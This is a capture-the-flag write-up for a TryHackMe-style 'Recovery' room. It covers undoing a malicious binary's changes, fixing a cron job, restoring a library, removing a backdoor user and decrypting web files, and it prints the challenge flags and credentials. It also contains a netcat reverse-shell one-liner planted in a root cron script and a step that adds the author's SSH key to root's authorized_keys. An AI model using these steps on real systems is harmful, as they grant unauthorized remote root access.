# RECOVERY

```
ssh:
alex : madeline
```

Once login with ssh, we can only see "YOU DIDNT SAY THE MAGIC WORD!" over and over again.
Using scp to download the binary mentioned by Alex, which is located in his home directory.
```
scp alex@recovery.thm:fixutil .
```

Open it with ghidra and we can see that it modified the `.bashrc` file on `/home/alex`. So we just need to delete the file then we can log in.\
First download a copy of `.bashrc` using scp again and remove the while true line. Then delete the file on the machine using ssh.
```
ssh alex@recovery.thm rm .bashrc
```
Once it is done, log in with ssh again and we're in.\
Refresh the page on port 1337 and we got out first flag, Flag 0.
```
THM{d8b5c89061ed767547a782e0f9b0b0fe}
```

After we're logged in, we kept getting kicked out once in awhile. Check the crontab to see is there any cronjob running
```
cat /etc/crontab
```
... but not luck. Check in `/etc/cron.d` and we can see there is a cronjob named evil. Further insepction shows it execute `/opt/brilliant_script.sh` as root. Looking at the file, it shows that it kept killing ssh process. Just comment out the line and we're fine. Add in our own payload for reverse shell as well to get root access.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```
Now refresh the page again and we got Flag 1.
```
THM{4c3e355694574cb182ca3057a685509d}
```


After we're in as root, let's go back to the `fixutil` binary again. We see that it modified the `/lib/x86_64-linux-gnu/liblogging.so` file. So we download that file with scp again and run strings on the file. While scanning through the file, it shows that the original `liblogging.so`, which is copied to `/tmp/liblogging.so` by fixutil, was then copied back to same directory but with a different name, `oldliblogging.so`. Now delete the modified `liblogging.so` and rename `oldliblogging.so` as `liblogging.so`. Flag 2 was presented to us.
```
THM{72f8fe5fd968b5817f67acecdc701e52}
```

Using the reverse shell we got is still quite unstable, we can add our ssh public key, located at `/home/<user>/.ssh/id_rsa.pub` into `/root/.ssh/authorized_keys` on the machine. Then we can ssh into the machine as root without password.

Further inspection on the modified `liblogging.so` shows that the `authorized_keys` file was tampered as well. Delete the ssh-key in it which is not ours then Flag 3 is found.
```
THM{70f7de17bb4e08686977a061205f3bf0}
```

In the `liblogging.so` as well, we can see that the hacker added a user named security. Delete the user with any means and Flag 4 is given to us. Using either `deluser` or manually remove the user from `/etc/passwd` and `/etc/shadow` will work.
```
THM{b0757f8fb8fe8dac584e80c6ac151d7d}
```


Now for the last flag we need to recover the encrypted file. Inspecting the `liblogging.so` we knows that it is encrypted by xor-ing the file with a key. This can be seen by the line XOREncryptWebFiles. The key is located in `/opt/.fixutil/backup.txt`. I've wrote a [program](webfile/decrypt.py) to decrypt the file. After decrypting the file, replace the file in `/usr/local/apache2/htdocs` with it and we're done.
```
THM{088a36245afc7cb935f19f030c4c28b2}
```